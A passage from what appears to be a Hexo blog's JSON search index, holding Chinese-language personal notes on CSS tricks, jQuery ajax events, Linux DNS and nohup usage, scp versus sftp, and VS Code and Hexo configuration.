Xuite日誌](http://blog.xuite.net/axian/blog/230222028-%E7%94%A8Stickies%E4%BE%BF%E5%88%A9%E8%B2%BC%E5%B9%AB%E6%82%A8%E8%A8%98%E4%BA%8B%E6%8F%90%E9%86%92%E9%82%84%E5%8F%AF%E4%BB%A5.....%E8%81%8A%E5%A4%A9)\n\n# 結論\n\n以功能為主的推薦使用Stickies\n單存想用用便利貼而已ATnotes\n\n\n# Dexpot 便利貼同步每個桌面方法\n\n在Dexpot可以設定桌面規則\n設定便利貼同步到每個視窗\n\n{% asset_img  dexpot1.png %}","tags":["dextop"],"categories":["實用工具"]},{"title":"使用CSS自訂checkbox方法","url":"%2Fblog%2F2018%2F04%2F26%2F%E4%BD%BF%E7%94%A8CSS%E8%87%AA%E8%A8%82checkbox%E6%96%B9%E6%B3%95%2F","content":"\n平常在用`checkout`都用在分支\n不過今天查看`checkout`也可以用在還原\n其實這是用checkbox css hack方法\n之前有一篇寫過了...但沒想到之前那篇沒寫完整\n還有之前有看過改CSS取消原本樣式\n改天來記錄一下吧!!\n[[CSS] checkbox hack 模擬在網頁開視窗](http://jsbin.com/hapineqoca/edit?css,output)\n\n<!--more-->\n\n簡單來講，就是利用checkbox CSS hack\n`:checked`跟`+`或`~`的條件(Selector)\n來實做這個問題\n實做後比較好懂\n\n# 自訂checkbox方法\nhttps://jsbin.com/bebetiqalu/edit?html,css,output\n","tags":["checkbox"],"categories":["網頁特效"]},{"title":"在display-none情況下GIF不會被render","url":"%2Fblog%2F2018%2F04%2F25%2F%E5%9C%A8display-none%E6%83%85%E6%B3%81%E4%B8%8BGIF%E4%B8%8D%E6%9C%83%E8%A2%ABrender%2F","content":"\n今天看到了gif在`display:block` 竟然動畫才開始動\n查了一下下，原來這跟render有關係\n在此做一下筆記...\n\n<!--more-->\n\n>\"display:none\" is Your Friend\nIf you use display:none on the GIF's html <img> tag, the GIF will not be rendered at all, and will not use any CPU or GPU resources. See this and this for explanations. \n[html - Does hiding an animated GIF with CSS conserve browser resources? - Stack Overflow](https://stackoverflow.com/questions/33762652/does-hiding-an-animated-gif-with-css-conserve-browser-resources)\n\n>display:none; elements are not in the render tree all, so they will perform better at face value.\nhttps://stackoverflow.com/a/11757103\n[How Browsers Work: Behind the scenes of modern web browsers - HTML5 Rocks](https://www.html5rocks.com/en/tutorials/internals/howbrowserswork/#Render_tree_construction)\n[前端新手村 都市傳說之隱藏元素的手法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10195447?sc=iThelpR)\n\n\n有在[javascript - Proper way to reset a GIF animation with display:none on Chrome - Stack Overflow](https://stackoverflow.com/questions/10730212/proper-way-to-reset-a-gif-animation-with-displaynone-on-chrome)\n看到使用[JSFiddle](http://jsfiddle.net/ult_combo/F8Q44/3/)Firefox,IE都會重置\n但是CHROME不會...\n有在裡面文章找到解法https://stackoverflow.com/a/21104927\n[http://jsfiddle.net/F8Q44/19/](http://jsfiddle.net/F8Q44/19/)\n```js\n$('img').show().each(function() {\n    this.offsetHeight;\n}).prop('src', 'image src');\n```\n\n這個問題好像是我之前寫的render問題解決方法...\n[[JavaScript] 網頁渲染的過程 (rendering pipline) « 進擊的程式新手](http://malagege.logdown.com/posts/1731337-javascript-web-page-rendering-rendering-pipline)\n\n\n常使用`prop`用在checked上面，不過今天看到這個用法\n查看了一下官網文件\n>It should be used when setting selectedIndex, tagName, nodeName, nodeType, ownerDocument, defaultChecked, or defaultSelected. Since jQuery 1.6, these properties can no longer be set with the .attr() method. They do not have corresponding attributes and are only properties.\n\n有些以前沒辦法控制selectedIndex, tagName, nodeName, nodeType, ownerDocument, defaultChecked, or defaultSelected.這些東西\n不過現在jQuery可以用prop抓到資訊\n\n[javascript - jquery .prop('defaultSelected') seems to malfunction in IE9 - Stack Overflow](https://stackoverflow.com/questions/19932965/jquery-propdefaultselected-seems-to-malfunction-in-ie9)\n\n```html\n<form action=\"\">\n  <input type=\"checkbox\" name=\"\" id=\"\" checked>\n  <input type=\"reset\" value=\"test\">\n</form>\n```\n><input> elements of type \"reset\"  are rendered as buttons, with a default click event handler that resets all of the inputs in the form to their **initial values**.\n很多網站教清空表單\n但其實正確要說還原表單預設值\n(怎麼會寫到這個，因為玩到checkbox,defaultSelected就突然想到reset問題，結果不出所料)\n\n\n結論沒事還是不要用gif做倒數計時...\n\n","tags":["image"],"categories":["CSS"]},{"title":"jQuery自訂的ajax Event","url":"%2Fblog%2F2018%2F04%2F24%2Fjquery%E8%87%AA%E8%A8%82%E7%9A%84ajax%20Event%2F","content":"\n\n今天看到[Ajax-Global Ajax Event Handlers .ajaxComplete()、.ajaxError()、.ajaxSend()、.ajaxStart()、.ajaxStop()、.ajaxSuccess() | 阿沙布魯 - 點部落](https://dotblogs.com.tw/brooke/2016/07/10/142933)\n平常都不會這樣寫，發現這樣寫可以模組化\n今天用少部份時間，來研究出來ajax event來實做出動畫特效\n**備註：ajax event都是jQuery自訂的，原JavaScript沒有這個東西**\n\n<!--more-->\n\n拿線上別人寫好的AJAX DEMO小改\n[jQuery AJAX request demo - JSFiddle](http://jsfiddle.net/WQXXT/12468/)\n\n```js\n$(document).on('ajaxSend',function(){\n    $('#overlay').show();\n    $('#overlay').width('100%');\n    \n    $(window).on('beforeunload',function(){\n  \t    if( confirm('查詢未完成，是否要離開?')){\n    \t    return true;\n        }\n        return false;\n    });\n}).on('ajaxComplete',function(){\n    $('#overlay').width('0px');\n    $(window).off('beforeunload');\n});\n  ```\n\n注意：jQuery onload 3.0就不能用了，要使用beforeunload才對\n[各个浏览器中对于beforeunload事件和unload事件的对比 | {XFE}](https://sinaad.github.io/xfe/2016/06/29/beforeunlod-vs-unload/)\n其實這個東西還可以寫一篇才對.....\n\n\n原本想說CSS不會花太多時間\n結果還是花了一點點....\n\n```css\n#overlay{\n  width: 0%;\n  height: 100%;\n  display: none;\n  position: fixed;\n  top:0px;\n  left:0px;\n  transition: all .3s;\n    overflow: hidden;\n}\n\n#overlay_mask{\n  width: 100vw;\n  height: 100%;\n  font-size: 6em;\n  background: rgba(0,0,0,0.6);\n    display:flex;\n    align-items:center;\n    justify-content:center;\n  /* display:none; */\n\n}\n\n```\n\n`#overlay_mask`那邊花了不少時間解決\n原本是用1000px，但覺得應該有更好的\n使用`vh`沒有占全版\n`vw`就解決了\n\n>vw——代表视窗(Viewport)的宽度为1%，在我们的例子里50vw = 500px。\nvh——窗口高度的百分比 50vh = 400px。\nvmin——vmin的值是当前vw和vh中较小的值。在我们的例子里因为是横向模式，所以50vim = 400px。\nvmax——大尺寸的百分比。50vmax = 500px。\n著作权归作者所有。\n商业转载请联系作者获得授权,非商业转载请注明出处。\n原文: https://www.w3cplus.com/css/simplify-your-stylesheets-with-the-magical-css-viewport-units.html © w3cplus.com\n[視區相關單位vw, vh..簡介以及可實際應用場景 - 掃文資訊](https://hk.saowen.com/a/0d16a289be70d5fa8cb0b56df1c3ee78825f3f607e6870e30f769861f566a33b)\n\n\n花了不少時間，但相信這個對未來實做[[程式][JQuery] 讓AJAX運作的時候，跳出loding的訊息。－Part 1 @ 四處流浪的阿基。I am Vagrant Walker :: 痞客邦 ::](http://expect7.pixnet.net/blog/post/39829979-%5B%E7%A8%8B%E5%BC%8F%5D%5Bjquery%5D-%E8%AE%93ajax%E9%81%8B%E4%BD%9C%E7%9A%84%E6%99%82%E5%80%99%EF%BC%8C%E8%B7%B3%E5%87%BAloding%E7%9A%84%E8%A8%8A)\n\n>    .ajaxComplete() - runs for every request that completes, use this when you want to do something with each request/result. Note that this doesn't replace the success handler, since the parsed data is not one of the arguments (and it runs even when there's an error) - you may want .ajaxSuccess() in some per-request situations instead.\n    .ajaxStop() - runs when every batch of requests completes, usually you'd use this in combination with .ajaxStart() for things like showing/hiding a \"Loading...\" indicator of some sort - or to do something else once a batch of AJAX requests finishes, like a master last step.\n[ajax - jquery::ajaxStop() versus jquery::ajaxComplete() - Stack Overflow](https://stackoverflow.com/questions/4419241/jqueryajaxstop-versus-jqueryajaxcomplete)\n\n恩...英文弱弱的...有找一下中文版說明XD\n>    .ajaxComplete() ——運行每個請求完成,用這個當你想做一些與每個請求/結果。 注意這並不替換 success 處理程序，因為解析的數據不是一個參數( 即使有錯誤，它也運行) - 你可能需要 .ajaxSuccess() 在某些per-request情況下。\n    .ajaxStop() ——運行當完成每批請求,通常你有使用這種結合 .ajaxStart() 例如顯示/隱藏某種\"正在載入。\"指示器,或者做一些其他一批ajax請求完成後,就像一個主人的最後一步。\n[jquery::ajaxStop() 与 jquery::ajaxComplete( )_ajax_帮酷编程问答](http://hant.ask.helplib.com/ajax/post_779385)\n\n\n相信這個能跟下面UI整合，有空再實做\n[waitMe](http://vadimsva.github.io/waitMe/)\n[busy-load](https://piccard21.github.io/busy-load/)\n[jQuery BlockUI Plugin](http://malsup.com/jquery/block/#page)\n\n因為BlockUI看到是用`$(document).ajaxStop($.unblockUI); `，有去找兩著比較ajaxComplete、ajaxStop\n我看到範例是用ajaxComplete，不過照文件說用ajaxStop做顯示/隱藏是最好的樣子\n\n\n\n這篇其實有很多雜七雜八的東西，其實要分開寫會比較好...\n不過哪天再踩到雷再補好了\n","tags":["event"],"categories":["jQuery"]},{"title":"git還原commit時候檔案狀態","url":"%2Fblog%2F2018%2F04%2F23%2Fgit%E9%82%84%E5%8E%9Fcommit%E6%99%82%E5%80%99%E6%AA%94%E6%A1%88%E7%8B%80%E6%85%8B%2F","content":"\n\n\n\n","tags":["checkout"],"categories":["git"]},{"title":"CSS:active點擊事件妙用","url":"%2Fblog%2F2018%2F04%2F22%2FCSS%E8%A3%A1active%E9%BB%9E%E6%93%8A%E4%BA%8B%E4%BB%B6%E5%A6%99%E7%94%A8%2F","content":"\n一般我們學CSS很常看到:link,:active,:visited,:hover這幾個很常用在`a`\n不過今天我看到一個範例\n是用:active對`div`做點擊換背景事件!!!\n沒想到竟然可以對`div`做變化\n一般很常用mousedown,mouseup做處理\n這樣可以用CSS一次解決寫兩個JavaScript\n趕快來筆記一下\n\n<!--more-->\n\n`:active`除了對div會有影響\n看我實作測試\nhttp://jsbin.com/facifuvina/edit?html,css,js,output\n點擊div時候，其實`body:active`也會跟著變色\n所以:active點子子層的時候也會跟著影響父層\n所以使用也要了解這個問題！\n\n試著看API能不能看到一些`:active`資訊\n\n>An element is said to be in a formal activation state between the time the user begins to indicate an intent to trigger the element's activation behavior and either the time the user stops indicating an intent to trigger the element's activation behavior, or the time the element's activation behavior has finished running, which ever comes first.\n\n>An element is said to be being actively pointed at while the user indicates the element using a pointing device while that pointing device is in the \"down\" state (e.g. for a mouse, between the time the mouse button is pressed and the time it is depressed; for a finger in a multitouch environment, while the finger is touching the display surface).\n\n[HTML Standard](https://html.spec.whatwg.org/multipage/semantics-other.html#in-a-formal-activation-state)\n不知道是不是這個內容關係\n\n不過在[:active | CSS-Tricks](https://css-tricks.com/almanac/selectors/a/active/)這個網站有找到所有element都可以這樣用\n然後看一下支援表，沒想到支援度這麼高\n以前就有這個東西，都不知道orz\n\n\n>這個樣式可能會被後聲明的其他鏈接相關的偽類覆蓋，這些偽類包括 :link，:hover和 :visited。為了正常加上樣式，需要把 :active的樣式放在所有鏈接相關的樣式後，這種鏈接偽類先後順序被稱為LVHA順序: :link — :visited — :hover — :active。\n\n>注意: 在有多鍵鼠標的系統中，CSS 3 規定 :active 偽類必須只匹配主按鍵；對於右手操作鼠標來說就是左鍵。\n\n[:active - CSS：層疊樣式表 | MDN](https://developer.mozilla.org/zh-CN/docs/Web/CSS/:active)\n\n改天來記錄LVHA順序筆記吧!!\n\n參考來源：\n[:active - CSS: Cascading Style Sheets | MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:active)\n[HTML Standard](https://html.spec.whatwg.org/multipage/semantics-other.html#selector-active)\n[:active | CSS-Tricks](https://css-tricks.com/almanac/selectors/a/active/)","tags":[":active"],"categories":["CSS"]},{"title":"以固定行數切割文字檔案方法","url":"%2Fblog%2F2018%2F04%2F20%2F%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%2F","content":"\n\n最近公司做一個動作，需要把Excel檔案資料欄位\n複製到SQL做IN查詢動作\n不過資料真的太多了，需要做分開處理\n目前文件說5000分別丟到SQL去查\n不過看了一下資料，共10000多筆資料\n查一下有什麼方法可以交給電腦處理\n\n<!--more-->\n\n## 使用Emeditor\n[用 EmEditor 分割、合併超大 TXT 純文字檔 – 【重灌狂人】](https://briian.com/38454/)\n\n「工具」→「分割/合併」→「把目前文件或指定檔案分割成多個檔案」\n\n資料夾和檔名可以不用設定\n資料夾`$(DIr)\\$(Filename)_split_$(SplitRunSerial)`\n檔案`$(Filename)_$(SplitFileSerial).$(Ext)`\n\n一直下一步就可完完成\n其實步驟還滿簡單的\n所以就沒截圖\n\n## Linux command split切割\n\n```bash\nsplit -l 10000 ping.txt ping.part -d \n```\n-l 是指行數，\n指定ping.txt到ping.part\n`-d`**沒有打**的話會命名partaa,partab...\n`-d`**有打**的話會是part01,part02\n\n\n\n更多可參考：\n[Linux 使用 split 指令將大檔案切割成小檔案，方便網路傳輸 - G. T. Wang](https://blog.gtwang.org/linux/split-large-tar-into-multiple-files-of-certain-size/)\n[split命令_Linux split 命令用法详解：分割任意大小的文件](http://man.linuxde.net/split)\n[How to split LARGE TEXT file into smaller using split utility on Windows - YouTube](https://www.youtube.com/watch?v=Xu2C2S30uRk)","tags":["txt"],"categories":["實用工具"]},{"title":"在Raspbain設定DNS","url":"%2Fblog%2F2018%2F04%2F19%2F%E5%9C%A8Raspbain%E8%A8%AD%E5%AE%9ADCHP%E6%99%82%E5%BE%8CDNS%2F","content":"今天在鳥哥看到\n> 例題：\n我的主機使用 DHCP 取得 IP ，很奇怪的，當我修改過 /etc/resolv.conf 之後，隔不多久這個檔案又會恢復成原本的樣子，這是什麼原因？ 該如何處理？\n答：\n因為使用 DHCP 時，系統會主動的使用 DHCP 伺服器傳來的資料進行系統設定檔的修訂。因此，你必須告知系統，不要使用 DHCP 傳來的伺服器設定值。 此時，你得要在 /etc/sysconfig/network-scripts/ifcfg-eth0 等相關檔案內，增加一行：『PEERDNS=no』，然後重新啟動網路即可。\n此外，如果你有啟動 CentOS 6.x 的 NetworkManager 服務，有時候也可能會產生一些奇特的現象哩！所以鳥哥是建議關掉它的！^_^ \n\n[鳥哥的 Linux 私房菜 -- DNS Server](http://linux.vbird.org/linux_server/0350dns.php#DNS_resolver_file)\n\n很久之前我有寫過類似的問題\n不過後來是用crontab來重覆寫這個問題\n今天有看到一個方法\n\n<!--more-->\n\n\n\n>由於我用的是ubuntu, 沒有fedora的/etc/sysconfig/network-scripts/ifcfg-eth0 設定檔. 但是, 可以修改/etc/dhcp3/dhclient.conf來達到同樣的目的:\n\n>$ sudo nano /etc/dhcp3/dhclient.conf\n加入:\nsupersede domain-name-servers 168.95.1.1, 8.8.8.8;\nsupersede domain-name \"domain1.com domain2.com\";\n\n>應該是跨發佈系統的.\n\n[Linux DHCP DNS設定問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10071258)\n\n目前沒有試過這個東西\n\n```\nsupersede domain-name-servers 8.8.8.8, 8.8.4.4;\n```\n\n[Ubuntu DNS 設定 @ Welkin小窩 :: 痞客邦 ::](http://welkinchen.pixnet.net/blog/post/5456817-ubuntu-dns-%E8%A8%AD%E5%AE%9A)\n```\nprepend domain-name-servers 8.8.8.8;\n```\n\n不過動物機還是不管用，但很多人好像都成功了\n不知道為什麼\n\n\n[networking - How to override the DHCP-provided nameserver? - Ask Ubuntu](https://askubuntu.com/questions/63160/how-to-override-the-dhcp-provided-nameserver)\n```\nA resolution that will resolve your problem is to configure your resolvconf package. This will give precedence to your preferred nameservers as well as any other desired settings resolv.conf settings such as search and domain preferences.\n\nEdit the file: /etc/resolvconf/resolv.conf.d/head\n\nPlace your desired nameservers and any other configurations you want to take preference when there is a network change there. When any changes to the network happen, the configuration there will always take precedence.\n\nAn example of the /etc/resolvconf/resolv.conf.d/head file:\n\n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n\nnameserver 8.8.8.8\nsearch mydomain.com\n\n```\n\n\n安裝resolvconf\n\n照head設定dns\n竟然成功了\n先記錄\n\n```text,/etc/resolv.conf\nnameserver 8.8.8.8\nnameserver 192.168.1.1\n```\n\n不過之前中華DNS好像有問題\n最近又不會了...\n可能正式機不會動\n\n\n參考來源：\n[鳥哥的 Linux 私房菜 -- DNS Server](http://linux.vbird.org/linux_server/0350dns.php#DNS_resolver_file)\n[Linux DHCP DNS設定問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10071258)\n[Ubuntu DNS 設定 @ Welkin小窩 :: 痞客邦 ::](http://welkinchen.pixnet.net/blog/post/5456817-ubuntu-dns-%E8%A8%AD%E5%AE%9A)\n[VPC DHCP类型的ECS修改DNS](https://zhuanlan.zhihu.com/p/34027883)\n[networking - How to override the DHCP-provided nameserver? - Ask Ubuntu](https://askubuntu.com/questions/63160/how-to-override-the-dhcp-provided-nameserver)","tags":["Ubuntu"],"categories":["Linux"]},{"title":"mysql查詢使用--註解踩到的雷","url":"%2Fblog%2F2018%2F04%2F18%2Fmysql%E6%9F%A5%E8%A9%A2%E4%BD%BF%E7%94%A8-%E8%A8%BB%E8%A7%A3%E8%B8%A9%E5%88%B0%E7%9A%84%E9%9B%B7%2F","content":"\n因為先前工作是使用DB2\n不過...最近新的工作使用Mysql\n\n發現竟然`--`註解不能用...\n\n<!--more-->\n\nGoogle一下，原來MySQL註解有3種\n\n1. \\#\n2. /**/\n3. \\-\\-   (但這種前後要留白)   ex : -- test\n\n希望下次不要踩到一樣的雷XD\n","tags":["註解"],"categories":["程式心法"]},{"title":"scp跟sftp是不一樣的東西","url":"%2Fblog%2F2018%2F04%2F16%2Fscp%E8%B7%9Fsftp%E6%98%AF%E4%B8%8D%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF%2F","content":"\n最近在公司做使用PHP做sftp傳輸上去\n結果一直出問題\n使用`ssh2_scp_send`傳輸檔案\n公司內部測試可以傳檔案\n但別的主機卻不能\n\n<!--more-->\n\n我在我的主機安裝ssh2環境（改天來補筆記）\n發現還是不能連到那台\n\n後來我決定，試著打 sftp command line連過去\n看到顯示`freeFTPd`，我就找相關資料\nfreeFTPd是window平台，可以免費架設sftp/ftp東西\n不過我爬到...\n\n>SFTP 雖然提供了一個安全可靠的傳送渠道，但是SFTP不能直接用瀏覽器開啟。需要使用支援SFTP的軟件才能進入SFTP Server，例如CuteFTP、WinSCP、或者Client Side的FileZilla。還有，freeFTPd的SFTP是不能用SSH登入及使用SCP傳送檔案的。\n[在Windows下使用freeFTP來架設SFTP Server & 我是我，葉子 - yzl1218 # 天空部落 TIAN #](https://yzl1218.tian.yam.com/posts/62969137)\n\n\n有找到使用`copy(\"ssh2.sftp://{$ftp_IP}\".$remote, $local);`就可以用了\n[PHP-sftp文件上传-11750810-51CTO博客](http://blog.51cto.com/11760810/2044534)\n\n我一直以為SCP跟SFTP是差不多東西\n但結果證明是不一樣的\nSCP沒有續傳功能，有點類似做`cp`指令動作透過ssh\n\n>sftp是基於ftp使用ssh\nSCP和CP命令相似，SFTP和FTP的使用方法也類似。SCP和SFTP的共同之處在於「使用SSH將文件加密才傳輸的」\n使用「WinSCP」或者「FileZilla」之類的客戶端，還可以和Windows之間進行文件傳輸。 \n\n>SCP和SFTP的不同之處，首先就是之前提到的，SCP使用「SCP命令」，SFTP則類似「FTP處理文件」的使用方式。\n它們的不同之處還不止如此，還有「SCP比較簡單，是輕量級的，SFTP的功能則比較多」。\n詳細說的話，雖然還有很多不同之處，但2者的最大不同之處在於「SFTP在文件傳輸過程中中斷的話，連接後還可以繼續傳輸，但SCP不行」。\n[SCP和SFTP區別 - - ITeye博客](http://wb8206656.iteye.com/blog/2231060)\n\n經過這次....\n下次應該不會再踩這個雷了吧\n","tags":["sftp"],"categories":["程式心法"]},{"title":"hexo在blog貼圖","url":"%2Fblog%2F2018%2F04%2F08%2Fhexo%E5%9C%A8blog%E8%B2%BC%E5%9C%96%2F","content":"\n\n\nhexo設定貼圖方法\n在\n```yml config.yml\npost_asset_folder: true\n```\n\n```\n{% asset_path slug %}\n{% asset_img slug [title] %}\n{% asset_link slug [title] %}\n```\n\n參考來源\n[資產資料夾 | Hexo](https://hexo.io/zh-tw/docs/asset-folders.html)\n","tags":["img"],"categories":["寫程式一些事"]},{"title":"git不需要打帳號密碼push(SSH)","url":"%2Fblog%2F2018%2F04%2F08%2Fgit%E4%B8%8D%E9%9C%80%E8%A6%81%E6%89%93%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BCpush%2F","content":"\n\n最近犯了一個小錯誤\nHexo裡的config裡面\nrepo: 放https開頭\n但是以為ssh金鑰能登入....\n\n<!--more-->\n\n但突然想到...我以前有寫過BitBucket\n[[BitBucket]做git pull一直問你輸入密碼 | 程式狂想筆記](https://malagege.github.io/blog/2017/11/06/logdown/2017-11-06-3301727/)\n這邊平常使用Github都是https開頭\n因為從github看到都是https開頭.....\n\n網路爬了一下有詳細說明\n[產生 SSH key 給 Bitbucket/Github 使用 | 噴火獸號：裴列恩之艦](https://nyllep.wordpress.com/2012/01/21/sshkey-for-bitbucket/)\n\n希望不要下次再採雷XD\n\n參考來源：\n[產生 SSH key 給 Bitbucket/Github 使用 | 噴火獸號：裴列恩之艦](https://nyllep.wordpress.com/2012/01/21/sshkey-for-bitbucket/)\n\n","tags":["github"],"categories":["寫程式一些事"]},{"title":"Code命令提示字元設定為zsh","url":"%2Fblog%2F2018%2F04%2F08%2FCode%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E5%AD%97%E5%85%83%E8%A8%AD%E5%AE%9A%E7%82%BAzsh%2F","content":"\n\n這篇記錄我在code設定command line設定\n<!--more-->\n\n# Visual Studio Code設定\n\n```json\n{\n    \"terminal.integrated.shell.windows\": \"C:\\\\Users\\\\Administrator\\\\.babun\\\\cygwin\\\\bin\\\\zsh.exe\",\n    \"terminal.integrated.fontFamily\": \"Hack\",\n\n}\n```\n\n但是後來決定放棄使用這個\n{% asset_img vs_zsh.gif code在zsh文字游標怪怪的 %}\n\n打算使用cmder...，不過在[VSCode 使用設定 | Mo1cibo's Blog](https://mousyball.github.io/2018/02/12/my-vscode-setting/#Integrated-Terminal)\n有看到好像也是跟我一樣的問題\n\n\n後來決定使用cmder，不過發現`cmder.exe`快捷鍵`ctrl+‵`可以彈出，再按一次`ctrl+‵`\n可以再縮小\n\n{% asset_img cmder_ctrl_.gif code在zsh文字游標怪怪的 %}\n\n感覺也沒必要再設定.....\n\n不過還是紀錄爬文設定\n```json\n// Command Prompt\n\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n// PowerShell\n\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"\n// Git Bash\n\"terminal.integrated.shell.windows\": \"C:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe\"\n// Bash on Ubuntu (on Windows)\n\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\bash.exe\"\n\n// zsh\n\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\bash.exe\",\n\"terminal.integrated.shellArgs.windows\": [\n    \"-c\",\n    \"zsh\"\n],\n\n// cmder\n\"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\",\n\"terminal.integrated.shellArgs.windows\": [\n    \"/K\",\n    \"C:\\\\cmder\\\\vscode.bat\"\n],\n\n// font & fontSize\n\"terminal.integrated.fontFamily\": \"DejaVu Sans Mono for powerline\",\n\"terminal.integrated.fontSize\": 15,\n```\n\n發現window可以用Ubuntu來啟動zsh\n我是用同事介紹的babun\n不過window感覺用cmder還滿順\n應該會先使用這個為優先\n\n參考來源:\n[VSCode 使用設定 | Mo1cibo's Blog](https://mousyball.github.io/2018/02/12/my-vscode-setting/#Integrated-Terminal)","tags":["visual studio code"],"categories":["實用工具"]},{"title":"Code自訂snippet","url":"%2Fblog%2F2018%2F04%2F08%2FCode%E8%87%AA%E8%A8%82snippet%2F","content":"\n\n最近寫blog很長手動打`<!--more-->`\n想說snippet來增加寫文章速度\n也不用在找`asset_img`\n語法我真的記不太住....\n\n<!--more-->\n\n目前我為Hexo設定的snippets\n```json\n{\n\t\"Read More\": {\n  \t\t\"prefix\": \"!more\",\n  \t\t\"body\": [\n    \t\t\t\"<!--more-->\"\n  \t\t],\n  \t\t\"description\": \"Read More\"\n\t},\n\t\"asset_img\": {\n\t\t\"prefix\": \"asset\",\n    \t\"body\": [\n    \t\t\"{% asset_img ${1:img.png} ${1:title} %}\"\n  \t\t],\n  \t\t\"description\": \"asset_img\"\n\t},\n\t\"asset_link\": {\n\t\t\"prefix\": \"asset\",\n\t\t\"body\": [\n\t\t\"{% asset_link ${1:url} ${1:title} %}\"\n\t\t],\n\t\t\"description\": \"asset_link\"\n\t}\n}\n```\n\n這三個寫文章應該很夠用\n\n\n\n##參考來源\n[snippet generator](https://pawelgrzybek.github.io/snippet-generator/?description=asset_link&tabtrigger=asset_link&snippet={% asset_link ${1:url} ${2:title} %}&mode=vscode)","tags":["vscode"],"categories":["寫程式一些事"]},{"title":"Hexo設定blog子資料夾網址","url":"%2Fblog%2F2018%2F04%2F08%2FHexo%E8%A8%AD%E5%AE%9Ablog%E5%AD%90%E8%B3%87%E6%96%99%E5%A4%BE%E7%B6%B2%E5%9D%80%2F","content":"\n\n設定筆記紀錄\n\n<!--more-->\n\n\n```yml\n# URL\n## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'\nurl: .\nroot: /blog/\npermalink: :year/:month/:day/:title/\npermalink_defaults:\n```","tags":["url"],"categories":["寫程式一些事"]},{"title":"Linux [nohup]背景執行(command關掉繼續work)","url":"%2Fblog%2F2018%2F03%2F31%2Flogdown%2F2018-03-31-linux-command-background-execution-turn-off-continue-work%2F","content":"最近有一台樹莓派網路比較不穩\n想到另外一台做ping的動作\n但是command line怎麼背景執行??\n\n<!--more-->\n\n# &\n只要在command後面加&\n就能背景執行\n想不到這麼簡單\n~~不過關掉command就會不見了~~\n正確來說好像還會繼續執行樣子...([nohup和&的区别 - xiaohuazi - 博客园](http://www.cnblogs.com/MYSQLZOUQI/p/5283761.html))\n\n# nohup ... &\n在前面加入nohup\n關掉command就會背景執行\n會輸出到`nohup.out`\n\n\n# nohup 跟  & 的指令差別\n>sh 22.sh &\n将任务放到后台 ，即使关闭xshell退出当前session依然继续运行，但标准输出和标准错误信息会丢失\nnohup sh 22.sh\n将任务放到后台，关闭标准输入，前台不再能够接收任何输入（标准输入），重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。\nnohup sh 22.sh  &\n将任务放到后台，但是依然可以使用标准输入，前台能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。\nnohup和&的缺点是，如果你要在一个shell会话里面执行多个命令和脚本，那么要每个命令和脚本都要加nohup和&非常麻烦，所以才有了screen和TMUX\n\n[nohup和&的区别 - xiaohuazi - 博客园](http://www.cnblogs.com/MYSQLZOUQI/p/5283761.html)\n\n`$ nohup your_command &>myout.txt &`\n可以重新導向新的輸出\n但注意`&>`是連在一起的，不能分開\n\n看到這篇...，突然想到screen跟tmux\n還沒記筆記，不過也忘了一半\n改天再補...\n\n發現Linux 做ping動作不會有時間...\n[Linux/Windows下Ping测试加上返回时间戳的方法 - 彩荷z](http://blog.caihez.com/?p=716)\n[Linux下长时间ping网络加时间戳并记录到文本 - CSDN博客](https://blog.csdn.net/gtlions/article/details/7974087)\n\n\n\n\n\n參考來源\n* [[linux[tips]nohup: 讓command在遠端執行，不因登出而中斷 @ 真實旅程 :: 痞客邦 ::](http://dragonspring.pixnet.net/blog/post/33257496-%5Blinux%5Btips%5Dnohup:-%E8%AE%93command%E5%9C%A8%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C%EF%BC%8C%E4%B8%8D%E5%9B%A0%E7%99%BB%E5%87%BA)\n* [nohup和&的区别 - xiaohuazi - 博客园](http://www.cnblogs.com/MYSQLZOUQI/p/5283761.html)\n* [Linux 學習日誌: 把命令放到背景執行](http://linuxdiary.blogspot.com/2007/10/blog-post_30.html)\n* [鳥哥的 Linux 私房菜 -- Linux 常用網路指令介紹](http://linux.vbird.org/linux_server/0140networkcommand.php#ifup)\n* [追蹤連線區域網路裝置的Raspberry Pi掃描器 - Make 國際中文版 > DIY Projects, Inspiration, How-tos, Hacks, Mods & More @ Makezine.com.tw - Tweak Technology to Your Will](http://www.makezine.com.tw/make2599131456/raspberry-pi8273188)\n* [Linux 學習日誌: 把命令放到背景執行](http://linuxdiary.blogspot.com/2007/10/blog-post_30.html)\n* [nohup和&後臺執行，程序檢視及終止 - 掃文資訊](https://tw.saowen.com/a/63aedd5ffa61bd61c20a8e25445d1f9aba8f4c24d4920b480460fba0a7625353)","tags":["nohup"],"categories":["Linux"]},{"title":"Raspberry pi 使用USB To TTL連接","url":"%2Fblog%2F2018%2F03%2F31%2Flogdown%2F2018-03-31-raspberry-pi-uses-usb-to-ttl-connection%2F","content":"最近樹梅派網路越來越不穩定...\n有時候對突然連不到...\n重開主機就可以了\n但這樣下去 